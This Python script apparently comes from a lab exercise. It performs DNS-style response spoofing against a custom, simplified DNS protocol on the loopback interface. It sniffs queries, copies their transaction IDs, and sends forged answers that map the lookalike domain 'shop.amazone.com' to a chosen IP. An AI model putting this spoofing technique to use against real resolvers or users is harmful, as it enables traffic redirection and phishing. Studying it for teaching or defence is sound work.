import binascii
import socket
import struct
import sys

import pyshark

def listen(sock, spoof):
    try:
        # Sniff live traffic on a specific interface and port
        capture = pyshark.LiveCapture(interface=r'\Device\NPF_Loopback', display_filter='udp.port == 22000')


        for packet in capture.sniff_continuously():
            hex_str = packet.udp.payload
            raw_bytes = binascii.unhexlify(hex_str.replace(":", ""))
            message = deserialize(raw_bytes)


            spoof["trans_id"] = message["trans_id"]
            spoof_message = serialize(spoof)
            sock.sendto(spoof_message, (get_local_ip(), 21000))
    except KeyboardInterrupt:
        sock.close()
        sys.exit()


def main():
    # create entry of spoofed data
    spoof = {"name": "shop.amazone.com", "type": "A", "result": "1.1.1.1", "ttl": "NONE", "static": 1, "flag": "RESPONSE"}
    # prepare entry for sending


    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    listen(sock, spoof)



def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def serialize(message: dict):
    """
    message has fields
    trans_id: the unique transaction id
    flag: query OR response
    name: the host name queried
    type: the record type being requested
    (if response) ttl: the TTL of the data
    (if response) result: the requested data
    """
    # 32 bits for unique transaction ID
    trans_id = int(message["trans_id"])
    # 4 bits for query or response
    flag_code = 0 if message["flag"].lower() == "query" else 1
    # pack the message header
    header = struct.pack("!I", trans_id) + struct.pack("!B", flag_code)

    # structure body
    # host name queried
    name_query = message["name"].encode() + b"\x00"
    # 4 bits for record type
    record_code = DNSTypes.get_type_code(message["type"])
    # pack the query body
    body = name_query + struct.pack("!B", record_code)

    if flag_code == 1:
        # added response structure
        # time to live for record - default send 60
        ttl_code = 60
        # result of lookup
        result = message["result"].encode() + b"\x00"
        # pack the response body
        response_body = struct.pack("!I", ttl_code) + result
        body += response_body

    data = header + body
    return data


def deserialize(data):
    # set empty dictionary to receive date
    message = {}
    # unpack transaction id
    trans_id = struct.unpack("!I", data[:4])[0]
    # unpack flag
    flag_code = struct.unpack("!B", data[4:5])[0]

    # add codes to message
    message["trans_id"] = trans_id
    message["flag"] = "QUERY" if flag_code == 0 else "RESPONSE"

    # find the end of the name
    # search for empty bits after flag code
    end_of_name = data.index(b"\x00", 5)
    # decode bits of name
    name_query = data[5:end_of_name].decode()
    # add name to message
    message["name"] = name_query

    # unpack record type
    record_code = struct.unpack("!B", data[end_of_name+1 :end_of_name + 2])[0]
    # lookup record type
    record_type = DNSTypes.get_type_name(record_code)
    # add record type to message
    message["type"] = record_type

    if flag_code == 1:
        # unpack ttl
        ttl_code = struct.unpack("!I", data[end_of_name + 2:end_of_name + 6])[0]
        result = data[end_of_name + 6:].decode()
        message["ttl"] = ttl_code
        message["result"] = result


    return message

class DNSTypes:
    """
    A class to manage DNS query types and their corresponding codes.

    Examples:
    >>> DNSTypes.get_type_code('A')
    8
    >>> DNSTypes.get_type_name(0b0100)
    'AAAA'
    """

    name_to_code = {
        "A": 0b1000,
        "AAAA": 0b0100,
        "CNAME": 0b0010,
        "NS": 0b0001,
    }

    code_to_name = {code: name for name, code in name_to_code.items()}

    @staticmethod
    def get_type_code(type_name: str):
        """Gets the code for the given DNS query type name, or None"""
        return DNSTypes.name_to_code.get(type_name, None)

    @staticmethod
    def get_type_name(type_code: int):
        """Gets the DNS query type name for the given code, or None"""
        return DNSTypes.code_to_name.get(type_code, None)


if __name__ == "__main__":
    main()
